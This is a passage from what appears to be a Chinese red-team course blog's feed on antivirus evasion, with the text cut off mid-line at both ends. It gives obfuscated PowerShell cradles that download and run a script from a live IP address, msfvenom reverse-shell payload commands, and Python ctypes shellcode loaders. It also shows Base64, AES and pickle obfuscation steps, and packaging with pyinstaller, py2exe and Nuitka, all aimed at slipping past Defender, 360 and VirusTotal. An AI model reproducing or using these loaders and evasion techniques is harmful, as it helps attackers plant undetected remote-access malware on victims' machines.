Net.WebClient).DownloadString(‘’ht’;$b&#x3D;’tp:&#x2F;&#x2F;47.94.236.117&#x2F;x.ps1’’));’;IEX ($a+$b)”</p></li><li><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430174121121.png" alt="image-20230430174121121"></p></li></ul><h5 id="3、垃圾数据干扰：（可绕过）"><a href="#3、垃圾数据干扰：（可绕过）" class="headerlink" title="3、垃圾数据干扰：（可绕过）"></a>3、垃圾数据干扰：（可绕过）</h5><p>powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString(‘ht’+’tp:&#x2F;&#x2F;47.94.236.117&#x2F;x.ps1’)</p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430172820159.png" alt="image-20230430172820159"></p><h5 id="4、替换关键字：（可绕过）"><a href="#4、替换关键字：（可绕过）" class="headerlink" title="4、替换关键字：（可绕过）"></a>4、替换关键字：（可绕过）</h5><p>powershell -NoExit “$c1&#x3D;’IEX(New-Object Net.WebClient).Downlo’;$c2&#x3D;’123(‘’<a href="http://47.94.236.117/x.ps1'')'.Replace('123','adString');IEX">http://47.94.236.117/x.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX</a> ($c1+$c2)”</p><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430173209154.png" alt="image-20230430173209154"></p><h5 id="5、Ladon混淆命令"><a href="#5、Ladon混淆命令" class="headerlink" title="5、Ladon混淆命令"></a>5、Ladon混淆命令</h5><h6 id="用hex等编码混淆（但是这里被杀了）"><a href="#用hex等编码混淆（但是这里被杀了）" class="headerlink" title="用hex等编码混淆（但是这里被杀了）"></a>用hex等编码混淆（但是这里被杀了）</h6><p><img src="/../images/Day109-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-PowerShell-%E6%B7%B7%E6%B7%86-%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD-%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-EXE%E7%94%9F%E6%88%90-%E5%A1%AB%E5%85%85%E6%9B%BF%E6%8D%A2/image-20230430192400395.png" alt="image-20230430192400395"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day108 免杀对抗-Python&amp;混淆算法&amp;反序列化&amp;打包生成器&amp;Py2exe&amp;Nuitka</title>
      <link href="/2023/04/27/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/"/>
      <url>/2023/04/27/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/mfwHF868WsV2LVXakxt9GQ.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Python-对执行代码做文章</p><p>2、Python-对shellcode做文章</p><p>3、Python-对代码打包器做文章</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码"><a href="#➢-Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码" class="headerlink" title="➢ Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码"></a>➢ Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码</h4><h4 id="➢-Python-混淆加密-Base64-amp-AES-amp-反序列化等"><a href="#➢-Python-混淆加密-Base64-amp-AES-amp-反序列化等" class="headerlink" title="➢ Python-混淆加密-Base64&amp;AES&amp;反序列化等"></a>➢ Python-混淆加密-Base64&amp;AES&amp;反序列化等</h4><h4 id="➢-Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka"><a href="#➢-Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka" class="headerlink" title="➢ Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka"></a>➢ Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</h4></blockquote><h3 id="Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码"><a href="#Python-原生态-MSF-amp-CS-amp-生成-amp-执行代码" class="headerlink" title="#Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码"></a>#Python-原生态-MSF&amp;CS&amp;生成&amp;执行代码</h3><p><strong>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c</strong></p><p><strong>cs 生成payload c或python</strong></p><h5 id="执行代码1："><a href="#执行代码1：" class="headerlink" title="执行代码1："></a>执行代码1：</h5><p><code>rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)</code></p><p><code>ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</code></p><p><code>handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)</code></p><p><code>ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</code></p><h5 id="执行代码2："><a href="#执行代码2：" class="headerlink" title="执行代码2："></a>执行代码2：</h5><p><code>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</code></p><p><code>ctypes.c_int(len(shellcode)),</code></p><p><code>ctypes.c_int(0x3000),</code></p><p><code>ctypes.c_int(0x40))</code></p><p><code>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</code></p><p><code>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</code></p><p><code>buf,</code></p><p><code>ctypes.c_int(len(shellcode)))</code></p><p><code>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</code></p><p><code>ctypes.c_int(0),</code></p><p><code>ctypes.c_int(ptr),</code></p><p><code>ctypes.c_int(0),</code></p><p><code>ctypes.c_int(0),</code></p><p><code>ctypes.pointer(ctypes.c_int(0)))</code></p><p><code>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</code></p><h3 id="Python-混淆加密-Base64-amp-AES-amp-反序列化等"><a href="#Python-混淆加密-Base64-amp-AES-amp-反序列化等" class="headerlink" title="#Python-混淆加密-Base64&amp;AES&amp;反序列化等"></a>#Python-混淆加密-Base64&amp;AES&amp;反序列化等</h3><h5 id="Ps：具体见代码及讲解思路"><a href="#Ps：具体见代码及讲解思路" class="headerlink" title="Ps：具体见代码及讲解思路"></a>Ps：具体见代码及讲解思路</h5><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-–encrypt-base64-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-–encrypt-base64-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp –encrypt base64 lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp –encrypt base64 lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c</h5><h5 id="另外的Xor，Rc4等加密算法都可以实现测试"><a href="#另外的Xor，Rc4等加密算法都可以实现测试" class="headerlink" title="另外的Xor，Rc4等加密算法都可以实现测试"></a>另外的Xor，Rc4等加密算法都可以实现测试</h5><h5 id="1、Base64"><a href="#1、Base64" class="headerlink" title="1、Base64"></a>1、Base64</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428130650488.png" alt="image-20230428130650488"></p><h5 id="2、AES-base64"><a href="#2、AES-base64" class="headerlink" title="2、AES+base64"></a>2、AES+base64</h5><h6 id="这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本"><a href="#这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本" class="headerlink" title="这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本"></a>这个脚本里面有解密和加密功能，是为了调试，而真正的发行版本只应该会有解密脚本</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428131330518.png" alt="image-20230428131330518"></p><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428150642079.png" alt="image-20230428150642079"></p><h6 id="将上面的加密代码放到下面发布版本release，只需要解密代码就行"><a href="#将上面的加密代码放到下面发布版本release，只需要解密代码就行" class="headerlink" title="将上面的加密代码放到下面发布版本release，只需要解密代码就行"></a>将上面的加密代码放到下面发布版本release，只需要解密代码就行</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428132006748.png" alt="image-20230428132006748"></p><h6 id="运行后上线"><a href="#运行后上线" class="headerlink" title="运行后上线"></a>运行后上线</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428132024438.png" alt="image-20230428132024438"></p><h5 id="3、反序列化"><a href="#3、反序列化" class="headerlink" title="3、反序列化"></a>3、反序列化</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143109745.png" alt="image-20230428143109745"></p><h6 id="先写一个序列化的脚本将代码序列化后打印出来"><a href="#先写一个序列化的脚本将代码序列化后打印出来" class="headerlink" title="先写一个序列化的脚本将代码序列化后打印出来"></a>先写一个序列化的脚本将代码序列化后打印出来</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143409117.png" alt="image-20230428143409117"></p><h6 id="这是打印后的结果"><a href="#这是打印后的结果" class="headerlink" title="这是打印后的结果"></a>这是打印后的结果</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143529404.png" alt="image-20230428143529404"></p><h6 id="另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去"><a href="#另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去" class="headerlink" title="另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去"></a>另外写一个解密木马的脚本即执行木马的脚本，将上面打印出来的内容复制上去</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143653699.png" alt="image-20230428143653699"></p><h6 id="执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密"><a href="#执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密" class="headerlink" title="执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密"></a>执行以后上线（此处用msf，用cs同样可以），另外的Xor，Rc4等加密算法都可以实现测试，实现混合加密</h6><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428143814604.png" alt="image-20230428143814604"></p><h3 id="Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka"><a href="#Python-打包器选择-Pyinstall-amp-Py2exe-amp-Nuitka" class="headerlink" title="#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka"></a>#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</h3><h5 id="使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果"><a href="#使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果" class="headerlink" title="使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果"></a>使用不同的打包器会对同一打包内容的shellcode具有不同的免杀效果</h5><h4 id="1、pyinstaller（生成的exe文件比较大）"><a href="#1、pyinstaller（生成的exe文件比较大）" class="headerlink" title="1、pyinstaller（生成的exe文件比较大）"></a>1、pyinstaller（生成的exe文件比较大）</h4><p>-F, –onefile 打包一个单个文件，如果你的代码都写在一个.py文件的话，可以用这个，如果是多个.py文件就别用</p><p>-D, –onedir 打包多个文件，在dist中生成很多依赖文件，适合以框架形式编写工具代码，我个人比较推荐这样，代码易于维护</p><p>-K, –tk 在部署时包含 TCL&#x2F;TK</p><p>-a, –ascii 不包含编码.在支持Unicode的python版本上默认包含所有的编码.</p><p>-d, –debug 产生debug版本的可执行文件</p><p>-w,–windowed,–noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)</p><p>-c,–nowindowed,–console 使用控制台子系统执行(默认)(只对Windows有效)</p><h5 id="使用：pyinstaller-F-test-py"><a href="#使用：pyinstaller-F-test-py" class="headerlink" title="使用：pyinstaller -F test.py"></a>使用：pyinstaller -F test.py</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428153107147.png" alt="image-20230428153107147"></p><h4 id="2、py2exe"><a href="#2、py2exe" class="headerlink" title="2、py2exe"></a>2、py2exe</h4><h5 id="安装：pip-install-py2exe"><a href="#安装：pip-install-py2exe" class="headerlink" title="安装：pip install py2exe"></a>安装：pip install py2exe</h5><h5 id="打包：python-setup-py-py2exe"><a href="#打包：python-setup-py-py2exe" class="headerlink" title="打包：python setup.py py2exe"></a>打包：python setup.py py2exe</h5><h5 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h5><h5 id="setup-py"><a href="#setup-py" class="headerlink" title="setup.py"></a>setup.py</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">import py2exe</span><br><span class="line">INCLUDES = [&#x27;108-pickle-release&#x27;] #注意修改脚本项目名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">options = &#123;</span><br><span class="line"></span><br><span class="line">​    &quot;py2exe&quot;:</span><br><span class="line">​        &#123;</span><br><span class="line">​            &quot;compressed&quot;: 1,  # 0或1,1压缩，0不压缩</span><br><span class="line">​            &quot;optimize&quot;: 2,  # 0、1、2，文件的优化级别</span><br><span class="line">​            &quot;bundle_files&quot;: 1,  # 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定</span><br><span class="line">​            &quot;includes&quot;: INCLUDES,  # 列表，包含其它的一些模块</span><br><span class="line">​            &quot;dll_excludes&quot;: [&#x27;MSVCP90.dll&#x27;]  # 列表，包含的dll文件不会打包进exe程序</span><br><span class="line">​        &#125;</span><br><span class="line">&#125;</span><br><span class="line">setup(</span><br><span class="line">​    version=&#x27;1.0.0&#x27;,</span><br><span class="line">​    options=options,</span><br><span class="line">​    description=&quot;this is a xiaodi test&quot;,</span><br><span class="line">​    zipfile=None,  # 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中</span><br><span class="line">​    console=[&#123;&quot;script&quot;: &#x27;108-pickle-release.py&#x27;&#125;]  # 生成一个控制台形式的exe程序，对应的有windows=[]，生成GUI形式的exe程序</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428145821822.png" alt="image-20230428145821822"></p><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428153207361.png" alt="image-20230428153207361"></p><h4 id="3、Nuitka-生成的文件最小"><a href="#3、Nuitka-生成的文件最小" class="headerlink" title="3、Nuitka(生成的文件最小)"></a>3、Nuitka(生成的文件最小)</h4><p>–standalone：方便移植到其他机器，不用再安装python</p><p>–show-memory –show-progress：展示整个安装的进度过程</p><p>–nofollow-imports：不编译代码中所有的import</p><p>–follow-import-to&#x3D;utils,src：需要编译成C++代码的指定的2个包含源码的文件夹，这里用,来进行分隔。</p><p>–output-dir&#x3D;out：指定输出的结果路径为out。</p><p>–windows-disable-console：运行exe取消弹框。</p><p>–mingw64 #默认为已经安装的vs2017去编译，否则就按指定的比如mingw(官方建议)</p><p>–standalone 独立环境，这是必须的(否则拷给别人无法使用)</p><p>–windows-disable-console 没有CMD控制窗口</p><p>–output-dir&#x3D;out 生成exe到out文件夹下面去</p><p>–show-progress 显示编译的进度，很直观</p><p>–show-memory 显示内存的占用</p><p>–include-qt-plugins&#x3D;sensible,styles 打包后PyQt的样式就不会变了</p><p>–plugin-enable&#x3D;qt-plugins 需要加载的PyQt插件</p><p>–plugin-enable&#x3D;tk-inter 打包tkinter模块的刚需</p><p>–plugin-enable&#x3D;numpy 打包numpy,pandas,matplotlib模块的刚需</p><p>–plugin-enable&#x3D;torch 打包pytorch的刚需</p><p>–plugin-enable&#x3D;tensorflow 打包tensorflow的刚需</p><p>–windows-icon-from-ico&#x3D;你的.ico 软件的图标</p><p>–windows-company-name&#x3D;Windows下软件公司信息</p><p>–windows-product-name&#x3D;Windows下软件名称</p><p>–windows-file-version&#x3D;Windows下软件的信息</p><p>–windows-product-version&#x3D;Windows下软件的产品信息</p><p>–windows-file-description&#x3D;Windows下软件的作用描述</p><p>–windows-uac-admin&#x3D;Windows下用户可以使用管理员权限来安装</p><p>–linux-onefile-icon&#x3D;Linux下的图标位置</p><p>–onefile 像pyinstaller一样打包成单个exe文件</p><p>–include-package&#x3D;复制比如numpy,PyQt5 这些带文件夹的叫包或者轮子</p><p>–include-module&#x3D;复制比如when.py 这些以.py结尾的叫模块</p><p><strong>使用：nuitka –mingw64 –standalone –show-memory –show-progress –nofollow-imports –follow-import-to&#x3D;utils,src –output-dir&#x3D;out 108.py</strong></p><h5 id="生成后免杀效果也比较好"><a href="#生成后免杀效果也比较好" class="headerlink" title="生成后免杀效果也比较好"></a>生成后免杀效果也比较好</h5><h5 id="还可以做优化，将执行代码base64"><a href="#还可以做优化，将执行代码base64" class="headerlink" title="还可以做优化，将执行代码base64"></a>还可以做优化，将执行代码base64</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428154232144.png" alt="image-20230428154232144"></p><h5 id="用SuperSoft工具编码"><a href="#用SuperSoft工具编码" class="headerlink" title="用SuperSoft工具编码"></a>用SuperSoft工具编码</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428154255080.png" alt="image-20230428154255080"></p><h5 id="将编码后的内容重新赋值给新变量然后解码"><a href="#将编码后的内容重新赋值给新变量然后解码" class="headerlink" title="将编码后的内容重新赋值给新变量然后解码"></a>将编码后的内容重新赋值给新变量然后解码</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428154605817.png" alt="image-20230428154605817"></p><h5 id="执行后，打印出了加密后的shellcode内容"><a href="#执行后，打印出了加密后的shellcode内容" class="headerlink" title="执行后，打印出了加密后的shellcode内容"></a>执行后，打印出了加密后的shellcode内容</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428161047124.png" alt="image-20230428161047124"></p><h5 id="复制到解密上线脚本，最后再用这个打包"><a href="#复制到解密上线脚本，最后再用这个打包" class="headerlink" title="复制到解密上线脚本，最后再用这个打包"></a>复制到解密上线脚本，最后再用这个打包</h5><p><img src="/../images/Day108-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Python-%E6%B7%B7%E6%B7%86%E7%AE%97%E6%B3%95-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93%E5%8C%85%E7%94%9F%E6%88%90%E5%99%A8-Py2exe-Nuitka/image-20230428161133813.png" alt="image-20230428161133813"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day107 免杀对抗-C&amp;C++&amp;溯源ShellCode上线&amp;混淆变异算法&amp;回调编译执行</title>
      <link href="/2023/04/27/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/04/27/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、ShellCode-分析&amp;朔源&amp;感知</p><p>2、ShellCode-混淆&amp;编码&amp;算法</p><p>3、回调执行解析-API&amp;汇编&amp;句柄</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" 